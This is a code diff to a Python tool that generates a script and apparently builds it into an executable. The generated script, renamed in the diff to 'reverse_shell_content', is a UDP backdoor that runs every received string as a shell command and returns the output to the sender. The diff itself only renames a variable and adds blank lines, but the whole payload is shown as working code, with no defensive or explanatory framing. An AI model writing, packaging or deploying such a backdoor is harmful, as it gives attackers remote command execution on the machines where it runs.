@@ -7,7 +7,7 @@ import shutil
 
 def make_executable(output_directory, ipaddress, port, script_name, exe_name):
 
-    script_content = f'''
+    reverse_shell_content = f'''
 import socket
 import subprocess
 
@@ -18,16 +18,19 @@ socket.bind(server_address)
 while True:
     data, address = socket.recvfrom(4096)
     data_str = data.decode('utf-8')
+    
     print(f"[!] Recieved [{{data_str}}] from {{address[0]}} | {{address[1]}}")  
     try:
         output = subprocess.check_output(data_str, shell=True)
     except:
         output = b" [!] Invalid Command"
     socket.sendto(output, address)
+
+    
     '''
 
     with open(script_name, "w") as file:
-        file.write(script_content)
+        file.write(reverse_shell_content)
 
     try:
         if not os.path.exists(output_directory):
